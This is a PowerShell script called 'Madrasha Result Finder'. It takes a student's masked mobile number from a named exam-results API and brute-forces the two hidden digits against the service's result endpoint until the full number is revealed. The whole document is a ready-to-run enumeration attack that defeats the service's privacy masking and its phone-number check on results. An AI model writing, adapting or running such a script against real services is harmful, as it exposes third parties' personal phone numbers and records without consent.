# check_mobile.ps1
# PowerShell script to find full mobile number from API

# Clear screen
Clear-Host

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "   Madrasha Result Finder" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# Prompt user for input
$melhaq = Read-Host "Enter melhaq (e.g. g-1/1473)"
$class  = Read-Host "Enter class (e.g. 5)"
$years  = Read-Host "Enter year (e.g. 2025)"

Write-Host ""
Write-Host "Getting masked mobile number..." -ForegroundColor Yellow
Write-Host ""

# Step 1: Get masked mobile prefix
try {
    $validationResponse = Invoke-RestMethod `
        -Uri "https://api.wifaqresult.com/api/madrasha-validation" `
        -Method Get `
        -Body @{
            melhaq = $melhaq
            class  = $class
            years  = $years
        }
} catch {
    Write-Host "ERROR: Failed to reach validation API" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

# Extract 9-digit prefix before XX
$mobilePrefix = $null
if ($validationResponse.data -match '([0-9]{9})XX') {
    $mobilePrefix = $matches[1]
    Write-Host "Mobile prefix found: ${mobilePrefix}XX" -ForegroundColor Green
} else {
    Write-Host "ERROR: Could not extract mobile prefix from response." -ForegroundColor Red
    Write-Host "Response was: $($validationResponse | ConvertTo-Json -Depth 3)"
    Read-Host "Press Enter to exit"
    exit
}

Write-Host ""
Write-Host "Trying all last 2 digits (00-99)..." -ForegroundColor Yellow
Write-Host ""

$found = $false

# Step 2: Loop through last 2 digits
for ($i = 0; $i -le 99; $i++) {
    $suffix = "{0:D2}" -f $i
    $mobile = "$mobilePrefix$suffix"
    Write-Host "Trying $mobile ..."

    try {
        $response = Invoke-RestMethod `
            -Uri "https://api.wifaqresult.com/api/madrasha-result" `
            -Method Get `
            -Body @{
                melhaq = $melhaq
                class  = $class
                mobile = $mobile
                years  = $years
            }
    } catch {
        Write-Host "  Warning: API error for $mobile" -ForegroundColor Yellow
        continue
    }

    # Step 3: Check if result data exists
    if ($null -ne $response.data -and $response.data.Count -gt 0) {
        Write-Host ""
        Write-Host "=====================================" -ForegroundColor Green
        Write-Host "  SUCCESS!" -ForegroundColor Green
        Write-Host "  Full Mobile: $mobile" -ForegroundColor Green
        Write-Host "=====================================" -ForegroundColor Green
        $found = $true
        break
    }
}

if (-not $found) {
    Write-Host ""
    Write-Host "No matching mobile number found after trying all combinations." -ForegroundColor Red
}

Write-Host ""
Read-Host "Press Enter to exit"
